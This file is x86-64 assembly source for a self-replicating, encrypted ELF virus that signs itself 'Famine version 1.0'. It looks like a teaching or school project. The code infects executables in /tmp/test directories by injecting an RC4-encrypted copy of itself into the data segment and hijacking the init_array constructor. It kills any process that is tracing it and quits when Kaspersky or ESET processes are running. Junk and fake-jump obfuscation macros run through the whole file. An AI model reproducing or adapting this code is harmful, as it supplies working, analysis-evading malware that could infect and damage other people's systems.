BITS 64

%include "defines.s"
virus_len equ _end - _start
virus_lenq equ virus_len / 8
virus_lenb equ virus_len % 8

section .text
    global _start_first_time

_start_first_time:
    push    _end
    lea     rdx, [rdi + r9 * 4 + 24]

; [rsp]     cwd_fd
_start:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x10
    lea     rdi, [rel cwd]
    PUSH_RET
    mov     rsi, O_DIRECTORY | O_RDONLY
    xor     eax, eax
    add     al, SYS_OPEN
    syscall
    OBF_USELESS_INSTR 1
    mov     [rsp], eax
    call    anti_debug_av
    lea     rdi, [rel dir1]
    call    readdir
    lea     rdi, [rel dir2]
    call    readdir
    mov     edi, [rsp]
    xor     eax, eax
    add     al, SYS_FCHDIR
    syscall
    mov     edi, [rsp]
    xor     eax, eax
    add     eax, SYS_CLOSE
    syscall
    leave
    ret

; [rsp]         fd
; [rsp + 0x4]   buf_len
; [rsp + 0x8]   buffer
; [rsp + 0x10]  index
readdir:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x20
    mov     eax, SYS_CHDIR
    syscall
    mov     rsi, O_DIRECTORY | O_RDONLY
    xor     eax, eax
    add     eax, SYS_OPEN
    syscall
    mov     [rsp], eax

    xor     rdi, rdi
    mov     rsi, 0x1000
    add     rdx, PROT_READ | PROT_WRITE
    mov     r10, MAP_ANONYMOUS | MAP_PRIVATE
    OBF_USELESS_INSTR 2
    xor     r8, r8
    dec     r8
    xor     r9, r9
    xor     eax, eax
    add     al, SYS_MMAP
    syscall
    test    al, al
    jnz     end_readdir
    mov     [rsp + 0x8], rax

loop_dir:
    mov     edi, [rsp]
    mov     rsi, [rsp + 0x8]
    mov     rdx, DIRENT_MAX_SIZE
    xor     eax, eax
    add     al, SYS_GETDENTS64
    syscall
    cmp     eax, 0
    jle     end_readdir
    mov     [rsp + 0x4], eax
    xor     r8, r8
loop_buf_dirent:
    mov     [rsp + 0x10], r8w
    mov     r9, [rsp + 0x8]
    OBF_FAKE_JUMP
    cmp     BYTE [r9 + r8 + d_type], DT_REG
    jne     next_dirent
    lea     rdi, [r9 + r8 + d_name]
    PUSH_RET
    call    infect
next_dirent:
    mov     r9, [rsp + 0x8]
    movzx   r8, WORD [rsp + 0x10]
    OBF_FAKE_JUMP
    add     r8w, [r9 + r8 + d_reclen]
    cmp     r8w, [rsp + 4]
    jl      loop_buf_dirent
    jmp     loop_dir
end_readdir:
    mov     edi, [rsp]
    xor     eax, eax
    add     eax, SYS_CLOSE
    syscall
    mov     rdi, [rsp + 0x8]
    mov     rsi, 0x1000
    mov     eax, SYS_MUNMAP
    syscall
    leave
    ret

generate_key:
    push    rbp
    mov     rbp, rsp
    push    rdi
    lea     rdi, [rel key_file]
    xor     rsi, rsi ; O_RDONLY
    mov     eax, SYS_OPEN
    syscall
    OBF_FAKE_JUMP
    cmp     eax, 0
    jl      _end
    push    rax
    mov     rdi, rax
    OBF_USELESS_INSTR 2
    lea     rsi, [rel key]
    mov     rdx, key_len
    mov     eax, SYS_READ
    syscall
    pop     rdi
    mov     eax, SYS_CLOSE
    syscall
    leave
    ret

strcpy:
    lodsb
    stosb
    cmp     BYTE [rsi], 0
    jnz     strcpy
    ret

isnum:
    xor     rax, rax
    cmp     dil, '0'
    jl      is_num_failure
    cmp     dil, '9'
    jle     is_num_sucess
is_num_failure:
    inc     eax
is_num_sucess:
    ret

is_proc_dir:
    xor     eax, eax
    mov     rsi, rdi
loop_is_proc_dir:
    OBF_FAKE_JUMP
    cmp     BYTE [rsi], 0
    je      end_is_proc_dir
    PUSH_RET
    mov     dil, BYTE [rsi]
    call    isnum
    inc     rsi
    test    al, al
    jnz     loop_is_proc_dir
    inc     eax
end_is_proc_dir:
    ret

; [rsp]         fd
; [rsp + 0x4]   buf_len
; [rsp + 0x8]   buffer
; [rsp + 0x10]  index
anti_debug_av:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x20

    lea     rdi, [rel self_str]
    xor     rsi, rsi
    inc     rsi
    call    check_process
    
    lea     rdi, [rel proc_dir]
    OBF_USELESS_INSTR 3
    mov     rsi, O_DIRECTORY | O_RDONLY
    xor     eax, eax
    add     eax, SYS_OPEN
    PUSH_RET
    syscall
    mov     [rsp], eax

    xor     rdi, rdi
    mov     rsi, 0x1000
    add     rdx, PROT_READ | PROT_WRITE
    mov     r10, MAP_ANONYMOUS | MAP_PRIVATE
    xor     r8, r8
    dec     r8
    xor     r9, r9
    xor     eax, eax
    add     al, SYS_MMAP
    syscall
    test    al, al
    jnz     end_readdir
    mov     [rsp + 0x8], rax

loop_proc:
    mov     edi, [rsp]
    mov     rsi, [rsp + 0x8]
    mov     rdx, DIRENT_MAX_SIZE
    xor     eax, eax
    OBF_FAKE_JUMP
    add     al, SYS_GETDENTS64
    syscall
    cmp     eax, 0
    jle     end_readdir
    mov     [rsp + 0x4], eax
    xor     r8, r8
loop_proc_dirent:
    mov     [rsp + 0x10], r8w
    PUSH_RET
    mov     r9, [rsp + 0x8]
    cmp     BYTE [r9 + r8 + d_type], DT_DIR
    jne     next_proc_dirent
    lea     rdi, [r9 + r8 + d_name]
    call    is_proc_dir
    OBF_USELESS_INSTR 1
    test    al, al
    jz      next_proc_dirent
    lea     rdi, [r9 + r8 + d_name]
    xor     rsi, rsi
    call    check_process
next_proc_dirent:
    mov     r9, [rsp + 0x8]
    movzx   r8, WORD [rsp + 0x10]
    add     r8w, [r9 + r8 + d_reclen]
    cmp     r8w, [rsp + 4]
    jl      loop_proc_dirent
    jmp     loop_proc

; [rsp]         map
; [rsp + 0x8]   pid
; [rsp + 0x10]  self_bool
check_process:
    push    rbp
    mov     rbp, rsp
    push    rsi
    push    rdi
    xor     rdi, rdi
    mov     rsi, 0x1000
    xor     rdx, rdx
    PUSH_RET
    add     rdx, PROT_READ | PROT_WRITE
    mov     r10, MAP_ANONYMOUS | MAP_PRIVATE
    xor     r8, r8
    dec     r8
    xor     r9, r9
    xor     eax, eax
    add     al, SYS_MMAP
    syscall
    test    al, al
    jnz     quit_check_process
    push    rax

    mov     rdi, rax
    lea     rsi, [rel proc_dir]
    call    strcpy
    mov     rsi, QWORD [rsp + 0x8]
    call    strcpy
    lea     rsi, [rel status_file]
    call    strcpy

    mov     rdi, [rsp]
    mov     esi, O_RDONLY
    mov     eax, SYS_OPEN
    syscall
    cmp     eax, 0
    jl      munmap_quit_check_process
    mov     edi, eax
    mov     rsi, [rsp]
    mov     rdx, 0x1000 - 1
    OBF_FAKE_JUMP
    xor     eax, eax ; SYS_READ
    syscall
    cmp     eax, 0
    jl      munmap_quit_check_process
    add     rax, [rsp]
    mov     BYTE [rax], 0
    mov     eax, SYS_CLOSE
    syscall
    OBF_USELESS_INSTR 2
    mov     rax, [rsp + 0x10]
    test    rax, rax
    jnz     test_debugger
    mov     rdi, [rsp]
    add     rdi, 6 ; skip Name:\t to access name directly
    call    test_forbidden_program
    jmp     munmap_quit_check_process
test_debugger:
    mov     rdi, [rsp]
    lea     rsi, [rel tpid_str]
    call    strstr
    mov     rdi, rax
    call    atoi
    OBF_FAKE_JUMP
    test    eax, eax
    jz      munmap_quit_check_process
    mov     edi, eax
    PUSH_RET
    mov     esi, SIGKILL
    mov     eax, SYS_KILL
    OBF_FAKE_JUMP
    syscall
munmap_quit_check_process:
    mov     rdi, rax
    mov     rsi, 0x1000
    mov     eax, SYS_MUNMAP
    syscall
quit_check_process:
    leave
    ret

test_forbidden_program:
    mov     r8, rdi
    lea     rdi, [rel program_blacklist]
loop_program_blacklist:
    mov     rsi, r8
    repz    cmpsb
    mov     al, BYTE [rdi - 1]
    OBF_FAKE_JUMP
    test    al, al
    jz      _end
    xor     al, al
    repnz   scasb
    mov     al, BYTE [rdi]
    test    al, al
    jnz     loop_program_blacklist
    ret

strncmp:
    mov     rcx, rdx
    xor     rax, rax
    repe    cmpsb
    mov     al, BYTE [rdi - 1]
    sub     al, BYTE [rsi - 1]
    ret

strlen:
    xor     rax, rax
    OBF_USELESS_INSTR 3
    xor     rcx, rcx
    dec     rcx
    repnz   scasb
    not     rcx
    dec     rcx
    mov     rax, rcx
    ret

; [rsp]         needle_len
; [rsp + 0x8]   haystack_len
; [rsp + 0x10]  needle
; [rsp + 0x18]  haystack
strstr:
    push    rbp
    mov     rbp, rsp
    push    rdi
    push    rsi
    OBF_FAKE_JUMP
    call    strlen
    push    rax
    mov     rdi, [rbp - 0x10]
    call    strlen
    push    rax
    xor     r8, r8
loop_strstr:
    mov     rdi, [rsp + 0x18]
    add     rdi, r8
    mov     rsi, [rsp + 0x10]
    PUSH_RET
    mov     rdx, [rsp]
    call    strncmp
    test    rax, rax
    jnz     check_loop_strstr
    mov     rax, rdi
    jmp     quit_strstr
check_loop_strstr:
    inc     r8
    mov     rbx, r8
    add     rbx, [rsp]
    cmp     rbx, [rsp + 0x8]
    jle     loop_strstr
    xor     rax, rax
quit_strstr:
    leave
    ret

atoi:
    xor     rbx, rbx
    mov     rsi, rdi
    xor     rdi, rdi
loop_atoi:
    mov     dil, BYTE [rsi]
    call    isnum
    test    al, al
    jnz     end_atoi
    sub     dil, '0'
    mov     ecx, 10
    mov     eax, ebx
    OBF_FAKE_JUMP
    mul     ecx
    mov     ebx, eax
    add     ebx, edi
    inc     rsi
    jmp     loop_atoi
end_atoi:
    mov     eax, ebx
    ret

infect:
    push    rbp
    mov     rbp, rsp
    sub     rsp, STACK_FRAME_SIZE + 0x10 ; Let's be cautious 
    mov     [rsp + filename], rdi

    mov     esi, O_RDWR
    mov     eax, SYS_OPEN
    syscall
    cmp     eax, 0
    jl      quit_infect

    mov     [rsp + fd], eax
    mov     edi, [rsp + fd]
    OBF_FAKE_JUMP
    lea     rsi, [rsp + e_hdr]
    mov     rdx, ELFHDR_SIZE
    mov     eax, SYS_READ
    syscall

    lea     rbx, [rsp + e_hdr]
    lea     rax, [rbx + e_ident]
    cmp     [rax], DWORD ELF_MAGIC
    jne     close_quit_infect
    OBF_USELESS_INSTR 1
    OBF_USELESS_INSTR 2
    OBF_USELESS_INSTR 1
    OBF_USELESS_INSTR 3
    cmp     [rax + EI_CLASS], BYTE ELFCLASS64
    jne     close_quit_infect
    cmp     [rax + EI_DATA], BYTE ELFDATA2LSB
    jne     close_quit_infect
    cmp     [rax + EI_PAD], DWORD INFECTION_MAGIC
    je      close_quit_infect
    mov     rdx, [rax + e_phnum]
    test    rdx, rdx
    je      close_quit_infect
    mov     rdx, [rax + e_shnum]
    test    rdx, rdx
    je      close_quit_infect
    mov     ax, [rbx + e_type]
    cmp     ax, ET_EXEC
    je      right_type_check
    cmp     ax, ET_DYN
    jne     close_quit_infect

right_type_check:
    mov     edi, [rsp + fd]
    xor     rsi, rsi
    mov     rdx, SEEK_END
    mov     eax, SYS_LSEEK
    syscall
    mov     [rsp + file_size], rax
    mov     rsi, rax
    xor     rdi, rdi
    mov     rdx, PROT_READ | PROT_WRITE
    mov     r10, MAP_SHARED
    mov     r8d, [rsp + fd]
    xor     r9, r9
    mov     eax, SYS_MMAP
    syscall
    test    al, al
    jnz     close_quit_infect
    mov     [rsp + map], rax

    mov     [rax + e_ident + EI_PAD], DWORD INFECTION_MAGIC ; mark binary for infection

    mov     r8, rax
    add     r8, [rax + e_phoff]
    movzx   rcx, WORD [rax + e_phnum]
loop_phdrs:
    mov     r9, r8
    OBF_FAKE_JUMP
    sub     r9, [rsp + map]
    cmp     [r8 + p_type], DWORD PT_LOAD
    jne     next_phdr
    cmp     [r8 + p_flags], DWORD PF_R | PF_X
    jne     comp_data
save_text_infos:
    mov     [rsp + text_phdr_off], r9
    mov     rdx, QWORD [r8 + p_filesz]
    mov     [rsp + old_text_size], rdx
comp_data:
    cmp     [r8 + p_flags], DWORD PF_R | PF_W
    jne     next_phdr
save_data_infos:
    mov     [rsp + data_phdr_off], r9
next_phdr:
    add     r8w, [rax + e_phentsize]
    loop    loop_phdrs

loop_sections:  ; We loop from the end of the section table to get 
                ; the init_array content before reaching the rela.dyn section
    mov     rbx, [rsp + map]
    movzx   rax, WORD [rbx + e_shnum]
    movzx   rcx, WORD [rbx + e_shentsize]
    OBF_USELESS_INSTR 3
    mul     rcx
    add     rax, [rbx + e_shoff]
    add     rax, rbx
    mov     rdx, [rsp + text_phdr_off]
    add     rdx, [rsp + map]
    mov     rdx, [rdx + p_offset]
    add     rdx, QWORD [rsp + old_text_size]
    mov     cx, WORD [rbx + e_shnum]

test_last_text:
    sub     ax, WORD [rbx + e_shentsize]
    mov     r9, QWORD [rax + sh_offset]
    add     r9, QWORD [rax + sh_size]
    cmp     r9, rdx
    jne     test_init_array
    mov     QWORD [rsp + last_text_shdr_off], rax
    sub     QWORD [rsp + last_text_shdr_off], rbx
test_init_array:
    mov     r9d, [rax + sh_type]
    cmp     r9d, SHT_INIT_ARRAY
    jne     test_bss
    mov     QWORD [rsp + init_array_shdr_off], rax
    sub     QWORD [rsp + init_array_shdr_off], rbx
test_bss:
    cmp     r9d, SHT_NOBITS
    jne     test_rela
    test    QWORD [rax + sh_flags], SHF_TLS
    jnz     test_rela
    mov     QWORD [rsp + bss_shdr_off], rax
    PUSH_RET
    sub     QWORD [rsp + bss_shdr_off], rbx
test_rela:
    cmp     r9d, SHT_RELA
    je      get_init_rela
next_section:
    loop    test_last_text
    jmp     check_text_padding

get_init_rela:
    mov     r8, [rsp + map]
    mov     r10, [rsp + init_array_shdr_off]
    add     r10, r8
    add     r8, [r10 + sh_offset]
    mov     r8, [r8]
    mov     QWORD [rsp + old_init_func], r8
    mov     r10, [r10 + sh_addr]
    mov     r11, [rsp + map]
    OBF_FAKE_JUMP
    add     r11, [rax + sh_offset]
    mov     r12, r11
    add     r12, [rax + sh_size]
loop_rela:
    cmp     r10, [r11 + r_offset]
    je      found_init_rela
    add     r11, RELA_SIZE
    cmp     r11, r12
    jl      loop_rela
    jmp     next_section
found_init_rela:
    OBF_USELESS_INSTR 1
    mov     QWORD [rsp + init_rela_entry_off], r11
    sub     QWORD [rsp + init_rela_entry_off], rbx
    jmp     next_section

check_text_padding:
    mov     r8, [rsp + map]
    mov     r9, r8
    add     r9w, WORD [r8 + e_phentsize]
    add     r8, [rsp + text_phdr_off]
    add     r9, [rsp + text_phdr_off]
    mov     rbx, [r8 + p_offset]
    add     rbx, [r8 + p_filesz]
    mov     rax, [r9 + p_offset]
    sub     rax, rbx
    cmp     rax, payload_mprotect_len
    jle     munmap_quit_infect

remap_and_infect_data:
    mov     edi, DWORD [rsp + fd]
    mov     rax, [rsp + map]
    PUSH_RET
    add     rax, [rsp + bss_shdr_off]
    mov     rbx, [rax + sh_addr]
    cmp     rbx, [rax + sh_offset]
    jnz     bss_address_offset_diff
    xor     rbx, rbx
    jmp     adjust_file_size
bss_address_offset_diff:
    sub     rbx, [rax + sh_offset]
    sub     rbx, 0x1000
adjust_file_size:
    mov     rsi, [rsp + file_size]
    add     rsi, [rax + sh_size]
    add     rsi, rbx
    add     rsi, virus_len
    mov     QWORD [rsp + new_file_size], rsi
    mov     eax, SYS_FTRUNCATE
    syscall
    test    eax, eax
    jnz     munmap_quit_infect

    OBF_FAKE_JUMP
    mov     rdi, [rsp + map]
    mov     rsi, [rsp + file_size]
    mov     rdx, [rsp + new_file_size]
    xor     r10, r10
    add     r10b, MREMAP_MAYMOVE
    mov     eax, SYS_MREMAP
    syscall
    test    al, al
    jnz     munmap_quit_infect
    mov     [rsp + map], rax

shift_end_of_file:
    mov     rdi, [rsp + new_file_size]
    mov     rsi, [rsp + file_size]
    OBF_USELESS_INSTR 2
    mov     rcx, rsi
    add     rdi, rax
    add     rsi, rax
    add     rax, [rsp + bss_shdr_off]
    sub     rcx, [rax + sh_offset]
    inc     rcx
    std
memccpy_file: ; We copy the file from the end because destination and sources are overlapping
    lodsb
    stosb
    loop    memccpy_file
    cld

update_offsets_everywhere:
    mov     r9, [rsp + new_file_size]
    sub     r9, [rsp + file_size]
    add     [rsp + bss_shdr_off], r9
    PUSH_RET
    add     [rsp + last_text_shdr_off], r9
    add     [rsp + init_array_shdr_off], r9
    mov     rax, [rsp + map]
    add     [rax + e_shoff], r9
    mov     rcx, [rsp + bss_shdr_off]
    sub     rcx, [rax + e_shoff]
    mov     r10w, [rax + e_shnum]
    movzx   r8, WORD [rax + e_shentsize]
    mov     rax, rcx
    cqo
    div     r8
    movzx   rcx, r10w
    sub     rcx, rax
    dec     rcx ; r10w -> number, rax -> index so we have to shift it by -1
    mov     rax, [rsp + map]
    add     rax, [rsp + bss_shdr_off]
    add     rax, r8
shift_last_sections:
    add     [rax + sh_offset], r9
    add     rax, r8
    loop    shift_last_sections

update_sizes:
    mov     rax, [rsp + map]
    mov     r9, rax
    add     rax, [rsp + bss_shdr_off]
    OBF_USELESS_INSTR 1
    mov     r10, [rax + sh_size]
    add     r9, [rsp + data_phdr_off]
    add     QWORD [r9 + p_filesz], virus_len
    add     QWORD [r9 + p_filesz], rbx
    add     [r9 + p_filesz], r10
    add     QWORD [r9 + p_memsz], virus_len
    add     QWORD [r9 + p_memsz], rbx
    add     QWORD [rax + sh_size], virus_len
    mov     DWORD [rax + sh_type], SHT_PROGBITS

    mov     rdx, rax
    mov     rdi, [rsp + map]
    add     rdi, [rdx + sh_offset]
    mov     rcx, r10
    add     rcx, rbx
write_bss:
    xor     al, al
    stosb
    loop    write_bss

align_bss_offset_and_address:
    add     [rdx + sh_offset], rbx

copy_virus_in_data:
    mov     rdi, [rsp + map]
    add     rdi, [rdx + sh_offset]
    add     rdi, r10
    lea     rsi, [rel _start]
    mov     rcx, virus_lenq
    call    copy_payload
    PUSH_RET

    mov     rax, [rsp + map]
    add     rax, [rsp + bss_shdr_off]
    mov     rdx, [rax + sh_offset]
    add     rdx, r10
    mov     [rsp + payload_data_base_offset], rdx
    mov     rdx, [rax + sh_addr]
    add     rdx, r10
    mov     [rsp + payload_data_base_address], rdx

crypt_virus:
    call    generate_key
    mov     rdi, [rsp + map]
    OBF_FAKE_JUMP
    add     rdi, [rsp + payload_data_base_offset]
    mov     rsi, virus_len
    push    rdx
    call    rc4
    pop     rdx

format_text_code_chunk:
    mov     rbx, [rsp + map]
    OBF_USELESS_INSTR 3
    add     rbx, [rsp + data_phdr_off]
    mov     r8, [rbx + p_vaddr]
    mov     rdx, r8
    and     rdx, 0xfff
    sub     r8, rdx
    mov     rcx, [rbx + p_filesz]
    add     rcx, rdx
    mov     [rel data_len], rcx
    mov     rbx, [rsp + map]
    add     rbx, [rsp + text_phdr_off]
    mov     rax, [rbx + p_vaddr]
    add     rax, [rbx + p_memsz]
    mov     [rsp + payload_base_address], rax
    sub     r8, rax
    mov     [rel data_addr_offset], r8

    lea     rsi, [rel payload_mprotect]
    mov     rax, [rsp + map]
    add     rax, [rsp + text_phdr_off]
    mov     rdi, [rax + p_offset]
    add     rdi, [rax + p_filesz]
    mov     [rsp + payload_base_offset], rdi
    OBF_USELESS_INSTR 2
    add     rdi, [rsp + map]
    mov     rcx, payload_mprotect_len
copy_text_code_chunk:
    lodsb
    stosb
    loop    copy_text_code_chunk

    mov     rbx, [rsp + map]
    mov     rax, rbx
    add     rax, [rsp + text_phdr_off]
    add     QWORD [rax + p_filesz], payload_mprotect_len
    add     QWORD [rax + p_memsz], payload_mprotect_len
    add     rbx, [rsp + last_text_shdr_off]
    add     QWORD [rbx + sh_size], payload_mprotect_len

    PUSH_RET
    mov     rdx, [rsp + new_file_size]
    mov     [rsp + file_size], rdx
    mov     rdi, [rsp + payload_base_offset]
    mov     rsi, [rsp + payload_base_address]

; rdi       payload_base_offset
; rsi       payload_base_address
hijack_constructor:
    mov     rax, [rsp + map]
    mov     rbx, rax
    add     rbx, [rsp + init_array_shdr_off]
    add     rax, [rbx + sh_offset]
    mov     rdx, [rsp + payload_base_address]
    mov     [rax], rdx
    mov     r11, [rsp + map]
    add     r11, [rsp + init_rela_entry_off]
    mov     [r11 + r_addend], rdx
    add     rdi, [rsp + map]
    add     rdi, final_jump_offset_text
    mov     rdx, [rsp + old_init_func]
    add     rsi, final_jump_offset_text + 4
    sub     rdx, rsi
    mov     DWORD [rdi], edx

munmap_quit_infect:
    mov     rdi, [rsp + map]
    mov     rsi, [rsp + file_size]
    mov     eax, SYS_MSYNC
    syscall

    mov     rdi, [rsp + map]
    mov     rsi, [rsp + file_size]
    mov     eax, SYS_MUNMAP
    syscall

close_quit_infect:
    OBF_FAKE_JUMP
    mov     edi, [rsp + fd]
    mov     eax, SYS_CLOSE
    syscall
quit_infect:
    leave
    ret

copy_payload:
    lodsq
    stosq
    loop    copy_payload
    mov     cx, virus_lenb
    test    cx, cx
    jz      end_copy
copy_last_bytes:
    lodsb
    stosb
    loop    copy_last_bytes
end_copy:
    ret

payload_mprotect:
    push    rbx
    push    r12
    lea     rdi, [rel payload_mprotect]
    OBF_FAKE_JUMP
    add     rdi, [rel data_addr_offset]
    mov     rsi, [rel data_len]
    mov     rdx, PROT_READ | PROT_WRITE | PROT_EXEC
    PUSH_RET
    xor     rax, rax
    add     rax, SYS_MPROTECT
    syscall
    lea     rdi, [rel payload_mprotect]
    add     rdi, [rel data_addr_offset]
    OBF_FAKE_JUMP
    add     rdi, [rel data_len]
    sub     rdi, virus_len
    mov     rsi, virus_len
    push    rdi
    call    rc4
    OBF_USELESS_INSTR 1
    pop     rax
    call    rax
    pop     r12
    pop     rbx
    final_jump_opcode: db 0xe9
    final_jump: dd _end - $ - 4
    final_jump_offset equ final_jump - _start
    final_jump_offset_text equ final_jump - payload_mprotect

; rdi       crypt_pointer
; rsi       crypt_len
rc4:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x120
    sub     rsp, rsi
    OBF_FAKE_JUMP
    mov     [rsp], rdi
    mov     [rsp + 0x8], rsi
    mov     rcx, 0x100
    xor     al, al
    lea     rdi, [rsp + 0x10]
loop_init_vector:
    stosb
    inc al
    loop    loop_init_vector

    xor     r8, r8
    xor     r9, r9
    lea     rdi, [rel key]
    PUSH_RET
    lea     rsi, [rsp + 0x10]
    mov     cx, 0x100
rc4_init_loop:
    mov     rax, r8
    and     rax, 0x1f ; rax % key_len
    add     rax, rdi
    movzx   rdx, BYTE [rax]
    OBF_FAKE_JUMP
    mov     rbx, r8
    add     rbx, rsi
    movzx   r10, BYTE [rbx]
    add     r9, r10
    OBF_USELESS_INSTR 3
    add     r9, rdx
    movzx   r9, r9b
    mov     rax, r9
    add     rax, rsi
    mov     dl, BYTE [rax]
    OBF_FAKE_JUMP
    mov     BYTE [rax], r10b
    mov     BYTE [rbx], dl
    inc     r8
    loop    rc4_init_loop

rc4_crypt:
    mov     rcx, [rsp + 0x8]
    lea     rdi, [rsp + 0x110]
    OBF_FAKE_JUMP
    mov     rsi, [rsp]
    lea     r10, [rsp + 0x10]
    xor     r8, r8
    xor     r9, r9

rc4_crypt_loop:
    inc     r8
    movzx   r8, r8b
    mov     r11, r10
    add     r11, r8
    add     r9b, [r11]
    OBF_FAKE_JUMP
    movzx   r9, r9b
    mov     r12, r10
    add     r12, r9
    PUSH_RET
    mov     dl, [r12]
    mov     bl, [r11]
    mov     [r12], bl
    mov     [r11], dl
    mov     dl, [r11]
    add     dl, [r12]
    OBF_FAKE_JUMP
    movzx   rdx, dl
    add     rdx, r10
    OBF_USELESS_INSTR 2
    mov     al, [rdx]
    xor     al, BYTE [rsi]
    mov     BYTE [rdi], al
    inc     rdi
    inc     rsi
    loop    rc4_crypt_loop

    mov     rdi, [rsp]
    lea     rsi, [rsp + 0x110]
    OBF_FAKE_JUMP
    mov     rcx, [rsp + 0x8]
copy_crypted_mem:
    lodsb
    stosb
    loop    copy_crypted_mem

    leave
    ret

    key_len equ 32
    key: TIMES key_len db 0
    signature: db 0, "Famine version 1.0 (c)oded by alagroy-", 0
    data_len: dq 0
    data_addr_offset: dq 0

    payload_mprotect_len: equ $ - payload_mprotect
    dir1: db "/tmp/test/", 0
    dir2: db "/tmp/test2/", 0
    proc_dir: db "/proc/", 0
    status_file: db "/status", 0
    self_str: db "self", 0
    key_file: db "/dev/random", 0
    tpid_str: db "TracerPid:", 9, 0
        .len: equ $ - tpid_str
    cwd: db ".", 0
    program_blacklist: db "test", 0, "kaspersky", 0, "ESET", 0, 0

_end:
    xor     rdi, rdi
    mov     eax, SYS_EXIT
    syscall
